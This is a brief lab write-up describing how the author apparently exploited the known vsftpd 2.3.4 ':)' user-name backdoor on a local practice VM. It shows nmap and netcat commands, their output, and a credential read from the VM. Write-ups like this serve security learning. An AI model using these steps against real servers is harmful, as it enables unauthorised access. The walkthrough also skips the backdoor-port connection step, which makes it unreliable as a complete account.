This is VSFTPD Backdoor problem.
The vulnerability exploited ":)" in the login user name.

This is how I get access to the VM:

_First: I find the IP Address of the VM by pressing combination keys "fn", alt(option), and "f6".
And I got "192.168.56.101"

_Second: I run N-Map on the IP address "192.168.56.101" to get which port, and service are use.
I see that vsftpd is on port "21". 

>> nmap -A -T4 192.168.56.101

Nmap scan report for 192.168.56.101
Host is up (0.00066s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 6.0p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)

_Third: I run Net-Cat to look for vulnerability. 
And I got ":)"
I also google and found out that vsFTPd 2.3.4 has a backdoor port "6200" 
link: http://en.wikipedia.org/wiki/Vsftpd
So I enter "Hack:)" as user-name and "pingo" as password.

>> nc 192.168.56.101 21 -v 
220 Welcome to vsFTPd 2.3.4. Smile at login :).

Therefore, I got inside the VM.
Once I'm inside run "cat WELCOME" to get the username and password 
I got this:

user: vsftpd
pass: q35&bTB>
